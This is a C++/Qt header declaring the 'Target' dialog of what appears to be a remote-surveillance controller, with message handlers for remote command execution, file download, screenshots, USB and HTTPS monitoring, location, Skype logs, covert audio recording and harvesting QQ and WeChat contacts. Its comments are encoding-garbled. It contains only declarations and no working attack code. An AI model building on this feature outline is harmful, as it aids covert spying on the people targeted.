/*!
	Description : Ŀ����ƽ���
	Author		: Ruining Song
	Date		: 2013.11.6
	Remark		:

			>> 2013.12.10  ����ļ������Ϣ
*/

#ifndef TARGETDLG_H
#define TARGETDLG_H

#include <QtGui>
#include <windows.h>
#include <string>
#include <map>
#include "ui_targetdlg.h"

#include "target.h"
#include "pagetablewidget.h"
#include "waitdlg.h"

#define NETWORK_NOT_INUSE           0
#define NETWORK_WIFI_INUSE          1
#define NETWORK_3G_INUSE            2

#define WM_SET_TAR_STATUSINFO_W         (WM_APP + 300)

#define WM_NEW_FILETASK                 (WM_APP + 400)
#define WM_UPT_FILETASK_STATUS          (WM_APP + 401)
#define WM_UPT_FILETASK_PROGRESS        (WM_APP + 402)

#define WM_NEW_DIRTASK                  (WM_APP + 410)
#define WM_UPT_DIRTASK_STATUS           (WM_APP + 411)
#define WM_UPT_DIRTASK_STATISTIC        (WM_APP + 412)

#define WM_NEW_SEARCHTASK               (WM_APP + 420)
#define WM_UPT_SEARCHTASK_STATUS        (WM_APP + 421)

#define WM_FILETASK_FINISHED            (WM_APP + 430)

#define WM_UPDATE_USB_FILE              (WM_APP + 500)
#define WM_UPDATE_USB_OP                (WM_APP + 501)
#define WM_UPDATE_HTTPS                 (WM_APP + 502)
#define WM_UPDATE_SCREEN                (WM_APP + 503)
#define WM_UPDATE_LIRINFO               (WM_APP + 604)
#define WM_UPDATE_DIRINFO               (WM_APP + 605)
#define WM_UPDATE_SEARCHINFO            (WM_APP + 606)

#define WM_REMOTERUN_REDIRECT           (WM_APP + 601)
#define WM_REMOTERUN_OUTPUT             (WM_APP + 602)
#define WM_REMOTERUN_FINISHED           (WM_APP + 603)

#define WM_ONLINESEARCH_FOUND_BLOCK     (WM_APP + 701)
#define WM_ONLINESEARCH_FINISHED        (WM_APP + 702)
#define WM_ONLINESEARCH_ERRORED         (WM_APP + 703)

#define WM_CAPFULLSCREEN_FINISHED       (WM_APP + 705)

#define WM_FILEMONITOR_FINISHED			(WM_APP + 706)
#define WM_FILEMONITOR_CHANGED			(WM_APP + 707)

#define WM_NEW_LOCATION					(WM_APP + 708)

#define WM_NEW_SKYPE_RECORD				(WM_APP + 709)

#define WM_NEW_PLUGIN_DATA				(WM_APP + 800)
#define WM_NEW_THIRD_PLUGIN_FILE		(WM_APP + 900)

#define WM_APP_INFO_FINISHED			(WM_APP + 901)

#define WM_APP_QQ_ACCOUNT				(WM_APP + 910)
#define WM_APP_QQ_FRIEND				(WM_APP + 911)
#define WM_APP_QQ_TROOP					(WM_APP + 912)

#define WM_APP_WEIXIN_ACCOUNT			(WM_APP + 920)
#define WM_APP_WEIXIN_FRIEND			(WM_APP + 921)

#define GET_DIR_INFO_FIRST				0xFFFFFFFF
#define GET_DIR_INFO_AGAIN				0xEEEEEEEE

#define WM_NEW_BACKSOUND				(WM_APP + 1024)
#define WM_BACKSOUND_SETTING			(WM_APP + 1025)

typedef struct _CHG_INFO
{
	std::wstring remark;
	LONGLONG dwTime;
}CHG_INFO, *PCHG_INFO;


class Target;
class QAxWidget;
class CaptureDlg;
class LogDetailDlg;
class UserActionDlg;
class MultimediaDlg;
class FileCtrlDlg;
class RemoteCmdDlg;
class AdvanceMonitorDlg;
class MapInfoDlg;
class ThirdPluginDlg;
class AppInfoDlg;
class RecordDlg;

class TargetDlg : public QWidget
{
	Q_OBJECT

public:

	static const wchar_t* Net_description[5];

	// ö�ٶ���
	enum MONITOR_STATUS{NOT_MONITORED=0, MONITORING=1};

	// ���캯��
	TargetDlg(Target* target);

	// ��������
	~TargetDlg();

signals:
	void emitModifyCapturePolicy(unsigned int pTarget, int);
	void emitRefreshOnlineLogInfo();

public:
	
	// ���õ�ǰ tab ҳ
	void SetCurrentTab(QString name);

	// Ŀ������
	void TargetOnline();

	// Ŀ������
	void TargetOffline();

	void UpdateCapturePolicy();

	void RefreshOnlineLogInfo();

protected:

	// ������ʾ֮ǰ����ô˺���
	void showEvent(QShowEvent *e);

	// �ӹ� windows ��Ϣ
	bool winEvent(MSG *msg, long *result);

public slots:

	// ��ȡӦ������ (΢�ţ�qq��
	void GetAppData();

	void CleanAppData();

	void ExportAppData();

	void ModifyCapturePolicy();

private slots:

	// �ַ��� tab ҳ�ĳ�ʼ������
	void DispatchTabInit(int index);

	// ���뱾������Ŀ¼
	void onCmbLocalDirIndexChanged(int index);

	// �����������ť
	void onToolBarButtonClicked();

	///////////////////////////////////////////////

	//
	//  ����״̬
	//

	// ѡ���ļ�����ָ��
	void onTrMissionStatusItemClicked(QTreeWidgetItem* item, int column);

	// '����'
	void onBtnCountinueClicked();

	// '��ͣ'
	void onBtnPauseClicked();

	// 'ȡ��'
	void onBtnCancelClicked();

	// ���Ŀ¼�����б��е� item
	void onDirDownloadItemClicked(QTableWidgetItem* item);


public slots:
	


private:

	// �������΢��
	void InitWidgetAppearance();

	// �� tab ���õ� index
	int GetTabIndexFromName(QString name);

	// ��ʼ�� signal & slot
	void InitConnection();

	// ��ʼ����������Ŀ¼�б�
	void InitLocalDataDirList();

	// ��ʼ���ļ�����
	void InitFileCtrl();

	// ��ʼ������̨
	void InitRemoteCmd();

	// ��ʼ������״̬
	void InitTaskStatus();

	// ��ʼ����Ļ��ͼ
	void InitScreenshot();

	// ��ʼ������Ƶ���
	void InitMultimedia();

	// ��ʼ���û���Ϊ���
	void InitUserActionMonitor();

	// ��ʼ���߼��ļ����
	void InitAdvanceFileMonitor();

	// ��ʼ����������־
	void InitLogInfo();

	// ��ʼ����ͼ
	void InitMapInfo();

	// ��ʼ��Ӧ��ȡ֤
	void InitAppInfo();

	// ��ʼ���������������
	void InitThirdPlugin();

	// ��ʼ���豸¼��
	void InitRecordInfo();

	////////////////////////////////////////

	//
	// ����״̬
	//

	// ��ȡ��ǰ�����б�
	QTableWidget* GetActiveFTListView();

	// ����������б�
	void AddFileTaskToListView(FileTask* fileTask);

	// ����ļ��������б�
	QTableWidgetItem* AddFileDataTaskToListView(FileTask *fileTask, QTableWidget* list);

	// ��ѯ�ļ���������Ӧ�� item
	QTableWidgetItem* QueryFileTaskListItem(FileTask *fileTask, int* lpnDaeIndex,int* lpnFinIndex);

	// ���Ŀ¼�������б�
	void AddDirTaskToListView(DirTask *dirTask);

	// ���Ŀ¼��Ϣ��ȡ�������б�
	QTableWidgetItem* AddDirInfoTaskToListView(DirTask *dirTask);

	// ���Ŀ¼�����������б�
	QTableWidgetItem* AddDirDownTaskToListView(DirTask *dirTask);

	// ��Ӳ�����ݻش��������б�
	QTableWidgetItem* AddPluginDataTaskToListView(FileTask* fileTask);

	// ��Ӳ�������������б�
	QTableWidgetItem* AddPluginUptTaskToListView(FileTask* fileTask);

	// ��������������б�
	void AddSearchTaskToListView(SearchTask *searchTask);

	// ���»�ȡ���ż�¼��ͨ����¼
	void UpdatePhoneRecord();

	// ��ʼ�������б�
	void InitTaskList();

	////////////////////////////////////////

	//
	// ��Ϣ��Ӧ����
	//

	// ����״̬����Ϣ
	void on_WM_SET_TAR_STATUSINFO_W(MSG* msg);

	// �µ��ļ�����
	void on_WM_NEW_FILETASK(MSG* msg);

	// �����ļ�����״̬
	void on_WM_UPT_FILETASK_STATUS(MSG* msg);

	// �����ļ��������
	void on_WM_UPT_FILETASK_PROGRESS(MSG* msg);

	// �µ�Ŀ¼����
	void on_WM_NEW_DIRTASK(MSG* msg);

	// ����Ŀ¼����״̬
	void on_WM_UPT_DIRTASK_STATUS(MSG* msg);

	// ����Ŀ¼����ͳ��
	void on_WM_UPT_DIRTASK_STATISTIC(MSG* msg);

	// �µ���������
	void on_WM_NEW_SEARCHTASK(MSG* msg);

	// ������������״̬
	void on_WM_UPT_SEARCHTASK_STATUS(MSG* msg);

	// �ļ��������
	void on_WM_FILETASK_FINISHED(MSG* msg);

	// ���� USB �ļ�
	void on_WM_UPDATE_USB_FILE(MSG* msg);

	// ���� USB op
	void on_WM_UPDATE_USB_OP(MSG* msg);

	// ���� https
	void on_WM_UPDATE_HTTPS(MSG* msg);

	// ���½���
	void on_WM_UPDATE_SCREEN(MSG* msg);

	// ���´����б�
	void on_WM_UPDATE_LIRINFO(MSG* msg);

	// ����Ŀ¼�б�
	void on_WM_UPDATE_DIRINFO(MSG* msg);

	// ����������Ϣ
	void on_WM_UPDATE_SEARCHINFO(MSG* msg);

	// Զ��ִ��
	void on_WM_REMOTERUN_REDIRECT(MSG* msg);

	// Զ��ִ�����
	void on_WM_REMOTERUN_OUTPUT(MSG* msg);

	// Զ��ִ�н���
	void on_WM_REMOTERUN_FINISHED(MSG* msg);

	// �������� -> found block
	void on_WM_ONLINESEARCH_FOUND_BLOCK(MSG* msg);

	// ������������
	void on_WM_ONLINESEARCH_FINISHED(MSG* msg);

	// ������������
	void on_WM_ONLINESEARCH_ERRORED(MSG* msg);

	// ��������
	void on_WM_CAPFULLSCREEN_FINISHED(MSG* msg);

	// �ɹ�����ļ�����
	void on_WM_FILEMONITOR_FINISHED(MSG* msg);

	// �ļ�״̬�ı�
	void on_WM_FILEMONITOR_CHANGED(MSG* msg);

	// ��ȡ���µ� location
	void on_WM_NEW_LOCATION(MSG* msg);

	// �µ� Skype ��ؼ�¼
	void on_WM_NEW_SKYPE_RECORD(MSG* msg);

	// �µĲ������
	void on_WM_NEW_PLUGIN_DATA(MSG* msg);

	// �µĵ������������
	void on_WM_NEW_THIRD_PLUGIN_FILE(MSG* msg);

	// �µ�¼��
	void on_WM_NEW_BACKSOUND(MSG* msg);

	// ¼������
	void on_WM_BACKSOUND_SETTING(MSG* msg);

	// Ӧ��ȡ֤��ȡ���
	void on_WM_APP_INFO_FINISHED(MSG* msg);

	// ��� qq �˺�
	void on_WM_APP_QQ_ACCOUNT(MSG* msg);

	// ��� qq ����
	void on_WM_APP_QQ_FRIEND(MSG* msg);

	// ��� qq Ⱥ
	void on_WM_APP_QQ_TROOP(MSG* msg);

	// ���΢���˺�
	void on_WM_APP_WEIXIN_ACCOUNT(MSG* msg);

	// ���΢�ź���
	void on_WM_APP_WEIXIN_FRIEND(MSG* msg);



private:
	Ui::TargetDlg ui;

public:

	// ���ھ��
	HWND Handle;

	Target        *tarBlock;
	DWORD          dwTargetId;

	bool           bShowFlag;               // �ܽ����ܷ���ʾ
	int            nDirLastError;

private:

	bool            bDirDetailSelected;     // ����Ŀ¼���أ������Ǹ���ָ�����ָ�ѡ��


	// GUI ��ʼ����־
	//
	bool            bTaskManager;
	bool            bFileControl;
	bool            bAdvanceFileMonitor;
	bool            bUserAction;
	bool            bCmdConsole;
	bool            bHttps;
	bool            bLogInfo;
	bool            bScreen;
	bool			bMapInfo;
	bool			bAppInfo;
	bool			bThirdPlugin;
	bool			bMultimedia;
	bool			bRecord;

	// ��ص��ļ�����
	std::wstring	m_curMonitorType;

	CaptureDlg* m_captureDlg;
	LogDetailDlg* m_logDetailDlg;
	UserActionDlg* m_userActionDlg;
	MultimediaDlg* m_multimediaDlg;
	FileCtrlDlg* m_fileCtrlDlg;
	RemoteCmdDlg* m_remoteCmdDlg;
	AppInfoDlg* m_appInfoDlg;
	AdvanceMonitorDlg* m_advanceMonitorDlg;
	MapInfoDlg* m_mapInfoDlg;
	ThirdPluginDlg* m_thirdPluginDlg;
	RecordDlg* m_recordDlg;
};

#endif // TARGETDLG_H
